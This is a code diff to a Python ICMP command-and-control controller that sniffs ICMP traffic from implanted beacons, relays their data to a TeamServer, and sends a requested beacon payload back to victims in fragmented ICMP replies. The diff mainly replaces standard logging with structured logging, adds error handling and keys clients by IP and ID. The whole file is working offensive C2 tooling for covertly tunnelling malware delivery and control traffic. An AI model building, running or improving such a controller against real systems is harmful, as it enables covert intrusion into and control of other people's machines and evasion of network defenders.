@@ -1,13 +1,39 @@
 import logging
+import sys
 from scapy.all import sniff, send, IP, ICMP, Raw, AsyncSniffer
 import struct
 import socket
 import math
 import time
 import threading
+import structlog
 
-# Configure logging
-logging.basicConfig(level=logging.INFO, format="%(message)s")
+# === STRUCTLOG CONFIGURATION ===
+log_filename = "icmp_controller.log"
+
+logging.basicConfig(
+    level=logging.DEBUG,
+    format="%(message)s",
+    handlers=[
+        logging.StreamHandler(sys.stdout),  # Console
+        logging.FileHandler(log_filename, mode='a')  # File
+    ]
+)
+
+structlog.configure(
+    processors=[
+        structlog.stdlib.add_log_level,
+        structlog.processors.TimeStamper(fmt="iso"),
+        structlog.processors.JSONRenderer()
+    ],
+    logger_factory=structlog.stdlib.LoggerFactory(),
+    wrapper_class=structlog.stdlib.BoundLogger,
+    cache_logger_on_first_use=True,
+)
+
+logger = structlog.get_logger()
+
+# === CONFIGS ===
 
 ICMP_TAG = "{{ icmp_tag }}"
 TAG_SIZE = len(ICMP_TAG)
@@ -23,9 +49,12 @@ BEACON_ARCH = "x64"  # options: `x86`, `x64`
 
 class Client:
     def __init__(self, client_ip, icmp_id, tag, expected_inbound_data_size=0):
-        logging.info(
-            f"[+] Listening for transmission of {expected_inbound_data_size} total bytes, "
-            f"from {client_ip}, ID={icmp_id}, tag={tag}"
+        logger.info(
+            "New client listener created",
+            client_ip=client_ip,
+            icmp_id=icmp_id,
+            tag=tag,
+            expected_inbound_data_size=expected_inbound_data_size
         )
         self.client_ip = client_ip
         self.icmp_id = icmp_id
@@ -46,6 +75,7 @@ class Client:
         """
         Called each new checkin for the client. Collects all the inbound data, handles comms with teamserver, and sends data back to client.
         """
+        logger.info("Handling new check-in", client_ip=self.client_ip, icmp_id=self.icmp_id)
         # need to make sure this buffer is clear each new checkin
         self.data_from_client = b""
 
@@ -61,16 +91,20 @@ class Client:
         # need to add a special case to get the payload, as when sending payload options, the team server does not reply,
         # meaning that it just hangs there... so we need to do this so the controller can explicitly ask for the payload, then pass it on.
         if self.data_from_client == b"I WANT A PAYLOAD":
-            logging.info(
-                f"[+] Sending payload to client {self.client_ip} ID={self.icmp_id}"
+            logger.info(
+                "Client requested payload",
+                client_ip=self.client_ip,
+                icmp_id=self.icmp_id
             )
             self.send_fragmented_icmp(
                 client_ip=self.client_ip,
                 client_icmp_id=self.icmp_id,
                 full_payload=self.get_payload(),
             )
-            logging.info(
-                f"[+] Payload sent to client {self.client_ip} ID={self.icmp_id}"
+            logger.info(
+                "Payload sent to client",
+                client_ip=self.client_ip,
+                icmp_id=self.icmp_id
             )
             # wipe data after
             return
@@ -80,13 +114,14 @@ class Client:
         ######################################################
 
         # forward onto teamserver
-        logging.debug(
-            f"[+ PROXY] Forwarding data to TeamServer: {self.data_from_client}"
+        logger.debug(
+            "Forwarding data to TeamServer",
+            proxy_data=self.data_from_client
         )
         self.ts_send_frame(self.data_from_client)
 
         # Get response from TS
-        logging.debug("[+ PROXY] Getting response from TeamServer")
+        logger.debug("Getting response from TeamServer")
         data_from_ts_for_client = self.ts_recv_frame()
 
         # send to client
@@ -96,22 +131,36 @@ class Client:
             full_payload=data_from_ts_for_client,
             tag=ICMP_TAG.encode(),
         )
+        logger.info("Finished handling check-in", client_ip=self.client_ip, icmp_id=self.icmp_id)
 
     def get_payload(self) -> bytes:
         """
         Get payload from TeamServer
         """
-        logging.info(f"[+] Getting Payload from {TEAMSERVER_IP}:{TEAMSERVER_PORT}")
+        logger.info(
+            "Requesting payload from TeamServer",
+            teamserver_ip=TEAMSERVER_IP,
+            teamserver_port=TEAMSERVER_PORT
+        )
         self.ts_send_frame(f"arch={BEACON_ARCH}".encode())
         self.ts_send_frame(f"pipename={BEACON_PIPENAME}".encode())
         self.ts_send_frame(b"block=100")
         self.ts_send_frame(b"go")
         self.payload = self.ts_recv_frame()
-        logging.debug(f"[+] Received payload: {self.payload}")
+        logger.debug("Received payload", payload_size=len(self.payload))
 
-        if self.payload != b"":
-            logging.info(
-                f"[+] Payload from {TEAMSERVER_IP}:{TEAMSERVER_PORT} recieved successfully"
+        if self.payload:
+            logger.info(
+                "Payload received from TeamServer successfully",
+                teamserver_ip=TEAMSERVER_IP,
+                teamserver_port=TEAMSERVER_PORT,
+                payload_size=len(self.payload)
+            )
+        else:
+            logger.warning(
+                "Received an empty payload from TeamServer",
+                teamserver_ip=TEAMSERVER_IP,
+                teamserver_port=TEAMSERVER_PORT
             )
         return self.payload
 
@@ -122,11 +171,11 @@ class Client:
         if self.payload == b"":
             self.get_payload()
 
-            self.send_fragmented_icmp(
-                client_ip=self.client_ip,
-                client_icmp_id=self.icmp_id,
-                full_payload=self.payload,
-            )
+        self.send_fragmented_icmp(
+            client_ip=self.client_ip,
+            client_icmp_id=self.icmp_id,
+            full_payload=self.payload,
+        )
 
     def send_fragmented_icmp(
         self, client_ip, client_icmp_id, full_payload, tag=ICMP_TAG.encode()
@@ -136,12 +185,21 @@ class Client:
         and send immediately (no extra wait). The first reply is seq=0 (size),
         then seq=1..N data chunks.
         """
-        # 1) Send seq=0 reply with total-size (4 bytes)
         total_size = len(full_payload)
+        logger.info(
+            "Starting fragmented ICMP send",
+            client_ip=client_ip,
+            icmp_id=client_icmp_id,
+            total_size=total_size
+        )
+        # 1) Send seq=0 reply with total-size (4 bytes)
         size_bytes = total_size.to_bytes(4, "big")
 
-        logging.debug(
-            f"[*] Sending seq=0 reply to {client_ip} (ID={client_icmp_id}). Total payload={total_size} bytes"
+        logger.debug(
+            "Sending seq=0 size packet",
+            client_ip=client_ip,
+            icmp_id=client_icmp_id,
+            total_payload_size=total_size
         )
         self.send_icmp_packet(
             ip_dst=client_ip,
@@ -156,16 +214,21 @@ class Client:
 
         # warning for user when the total size is goingto be bigger than 1 packet
         if total_size > ICMP_PAYLOAD_SIZE:
-            logging.warning(
-                f"[!] Client {client_ip} ID: {client_icmp_id} is receiving a large transfer, beacon may appear offline while transfering data."
+            logger.warning(
+                "Client is receiving a large transfer, beacon may appear offline while transferring data.",
+                client_ip=client_ip,
+                icmp_id=client_icmp_id,
+                total_size=total_size
             )
 
         offset = 0
         seq = 1
         while offset < len(full_payload):
             chunk = full_payload[offset : offset + CHUNK_DATA_SIZE]
-            logging.debug(
-                f"    → Sending data chunk seq={seq}, data_bytes={len(chunk)}"
+            logger.debug(
+                "Sending data chunk",
+                seq=seq,
+                data_bytes=len(chunk)
             )
             self.send_icmp_packet(
                 ip_dst=client_ip,
@@ -178,20 +241,37 @@ class Client:
             seq += 1
             time.sleep(0.1)
 
+        logger.info(
+            "Finished sending fragmented ICMP data",
+            client_ip=client_ip,
+            icmp_id=client_icmp_id,
+            num_chunks=seq-1,
+            total_size=total_size
+        )
+
     def recv_fragmented_icmp(self):
         """
         Blocks until we’ve seen exactly self.expected_inbound_data_size bytes
         from (self.client_ip, self.icmp_id, tag=self.tag). Returns the assembled bytes.
         """
         expected_len = self.expected_inbound_data_size
+        logger.info(
+            "Starting to receive fragmented ICMP data",
+            client_ip=self.client_ip,
+            icmp_id=self.icmp_id,
+            expected_len=expected_len
+        )
         assembled_data = bytearray()
 
         max_data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE  # e.g. 1000 - 4 = 996
 
         # warning for user when the total size is goingto be bigger than 1 packet
         if expected_len > ICMP_PAYLOAD_SIZE:
-            logging.warning(
-                f"[!] Client {self.client_ip} ID: {self.icmp_id} is sending back a large transfer, beacon may appear offline while transfering data."
+            logger.warning(
+                "Client is sending back a large transfer, beacon may appear offline while transferring data.",
+                client_ip=self.client_ip,
+                icmp_id=self.icmp_id,
+                expected_len=expected_len
             )
 
         while len(assembled_data) < expected_len:
@@ -219,12 +299,21 @@ class Client:
             icmp_seq = incoming_pkt[ICMP].seq & 0xFFFF
             self.data_from_client += chunk_part
 
-            logging.debug(f"[+] Received chunk_data: {chunk_part!r}")
-            logging.debug(
-                f"[+ SNIFFER] packet seq={icmp_seq} received from {self.client_ip}, "
-                f"ID={self.icmp_id}, tag={self.tag}"
+            logger.debug("Received chunk data", chunk_part=repr(chunk_part))
+            logger.debug(
+                "Sniffer received packet",
+                seq=icmp_seq,
+                client_ip=self.client_ip,
+                icmp_id=self.icmp_id,
+                tag=self.tag
             )
 
+        logger.info(
+            "Finished receiving fragmented ICMP data",
+            client_ip=self.client_ip,
+            icmp_id=self.icmp_id,
+            received_bytes=len(assembled_data)
+        )
         return bytes(assembled_data)
 
     def send_icmp_packet(
@@ -240,18 +329,23 @@ class Client:
             / Raw(load=full_payload)
         )
         send(packet, verbose=False)
-        logging.debug(f"[+] Sent ICMP REPLY seq={icmp_seq}, len={len(full_payload)}")
+        logger.debug(
+            "Sent ICMP REPLY",
+            seq=icmp_seq,
+            payload_len=len(full_payload)
+        )
 
     def ts_recv_frame(self):
         # self.sock.setblocking(False)
         # self.sock.settimeout(2)
         raw_size = self.sock.recv(4)
         # print(raw_size)
-        logging.debug(f"Frame coming from TeamServer: {raw_size}")
+        logger.debug("Frame header from TeamServer", raw_size=raw_size)
         if len(raw_size) < 4:
-            logging.warning(f"TeamServer: Failed to read frame size: {raw_size}")
+            logger.warning("TeamServer: Failed to read frame size", raw_size=raw_size)
             raise ConnectionError("Failed to receive frame size.")
         size = struct.unpack("<I", raw_size)[0]
+        logger.debug("Unpacked frame header", frame_size=size)
 
         buffer = b""
         while len(buffer) < size:
@@ -260,11 +354,12 @@ class Client:
                 raise ConnectionError("Socket closed before full frame received.")
             buffer += chunk
 
+        logger.debug("Successfully received full frame from TeamServer", received_bytes=len(buffer))
         return buffer
 
     def ts_send_frame(self, data: bytes):
         size = len(data)
-        logging.debug(f"Frame going to TeamServer: size: {size} data:{data}")
+        logger.debug("Frame going to TeamServer", size=size, data=data)
         self.sock.sendall(struct.pack("<I", size))
         self.sock.sendall(data)
 
@@ -272,18 +367,23 @@ class Client:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.settimeout(10)  # 10 sec timeout
         try:
+            logger.info("Connecting to TeamServer...", server_ip=self.server_ip, server_port=self.server_port)
             self.sock.connect((self.server_ip, self.server_port))
-            logging.info(
-                f"[+] Connected to TeamServer at {self.server_ip}:{self.server_port}"
+            logger.info(
+                "Connected to TeamServer",
+                server_ip=self.server_ip,
+                server_port=self.server_port
             )
         except socket.timeout:
-            logging.info(
-                f"[!] Socket timed out - is listener up at {self.server_ip}:{self.server_port}?"
+            logger.error(
+                "Socket timed out - is listener up?",
+                server_ip=self.server_ip,
+                server_port=self.server_port
             )
             self.sock.close()
             exit()
         except Exception as e:
-            logging.info(f"[-] Connection failed: {e}")
+            logger.error("Connection failed", error=str(e), exc_info=True)
             self.sock.close()
             self.sock = None
             exit()
@@ -296,7 +396,8 @@ dict_of_clients = {}
 
 
 def go():
-    logging.info("[+] Starting ICMP Listener")
+    logger.info("Starting ICMP C2 Controller")
+    logger.info("Sniffer is now active and listening for packets...")
     sniff(filter="icmp", prn=packet_filter, store=0)
 
 
@@ -320,29 +421,43 @@ def packet_filter(packet):
 
     # When we see seq=0, that signals “start of a new transfer”
     if icmp_seq == 0:
-        logging.debug(f"[+] New seq=0 packet received from {client_ip}, ID={icmp_id}")
+        logger.debug(
+            "New seq=0 packet received",
+            client_ip=client_ip,
+            icmp_id=icmp_id
+        )
 
         # Strip off the 4-byte tag (“RQ47”)
         content = raw_load[len(ICMP_TAG) :]  # .rstrip(b"\x00")
-        logging.debug(f"[+] seq=0 content: {content}")
+        logger.debug("seq=0 content", content=content)
 
         # every other interaction will be here, where it sends a size in seq 0
-        expected_inbound_data_size = int.from_bytes(content[:4], "big")
+        try:
+            expected_inbound_data_size = int.from_bytes(content[:4], "big")
+        except IndexError:
+            logger.warning("Received seq=0 packet with insufficient data for size", client_ip=client_ip, icmp_id=icmp_id)
+            return
+
         if expected_inbound_data_size < 0:
-            raise ValueError(f"Invalid length={expected_inbound_data_size} in seq=0")
+            logger.error(f"Invalid length={expected_inbound_data_size} in seq=0", client_ip=client_ip)
+            return
 
         # if client alreadt in dict, based on id, use that class to handle it
         # problem, this cuold collide if same pid, could just add in ip as well.
-        key = icmp_id
+        key = (client_ip, icmp_id) # Using a tuple of IP and ID for a more unique key
         if key in dict_of_clients:
-            logging.info(f"[+] Client {client_ip} ID: {icmp_id} checking in")
+            logger.info(
+                "Existing client checking in",
+                client_ip=client_ip,
+                icmp_id=icmp_id
+            )
             new_size = int.from_bytes(raw_load[TAG_SIZE : TAG_SIZE + 4], "big")
             client = dict_of_clients[key]
             # set new expected size for the client to recieve
             client.expected_inbound_data_size = new_size
 
         else:
-            logging.info(f"[+] New Client: {client_ip} ID: {icmp_id}")
+            logger.info("New client discovered", client_ip=client_ip, icmp_id=icmp_id)
             client = Client(
                 client_ip=client_ip,
                 icmp_id=icmp_id,
@@ -356,6 +471,12 @@ def packet_filter(packet):
         # Program should be able to exit and the listeners still run per client due to the daemon setting
         t = threading.Thread(target=client.handle_data, daemon=True)
         t.start()
+        logger.debug(
+            "Spawning new thread for client handler",
+            thread_id=t.ident,
+            client_ip=client_ip,
+            icmp_id=icmp_id
+        )
 
 
 if __name__ == "__main__":
